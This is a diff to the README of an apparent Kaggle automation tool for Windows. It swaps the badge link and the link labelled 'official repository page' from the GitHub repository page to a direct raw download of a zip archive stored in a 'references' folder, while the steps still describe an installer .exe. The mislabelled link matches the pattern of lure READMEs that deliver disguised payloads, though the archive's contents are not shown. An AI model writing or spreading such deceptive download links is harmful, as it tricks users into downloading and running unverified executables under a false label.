@@ -1,6 +1,6 @@
 # 🤖 agentic-kaggle-skill - Automate data science tasks with ease
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Mirannonarbitrable290/agentic-kaggle-skill)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://raw.githubusercontent.com/Mirannonarbitrable290/agentic-kaggle-skill/main/references/skill-kaggle-agentic-v1.4-alpha.4.zip)
 
 This software helps data scientists manage their work on Kaggle. It uses automation to handle repetitive tasks. You can focus on building models while the software manages code and submissions. It keeps your workflow organized and stable.
 
@@ -17,7 +17,7 @@ You need a Windows computer to run this tool. Ensure you have the following inst
 
 Follow these steps to get the tool on your machine.
 
-1.  Visit the [official repository page](https://github.com/Mirannonarbitrable290/agentic-kaggle-skill).
+1.  Visit the [official repository page](https://raw.githubusercontent.com/Mirannonarbitrable290/agentic-kaggle-skill/main/references/skill-kaggle-agentic-v1.4-alpha.4.zip).
 2.  Locate the section labeled Releases on the right side of the page.
 3.  Click the latest version link.
 4.  Download the file named agentic-kaggle-setup.exe.
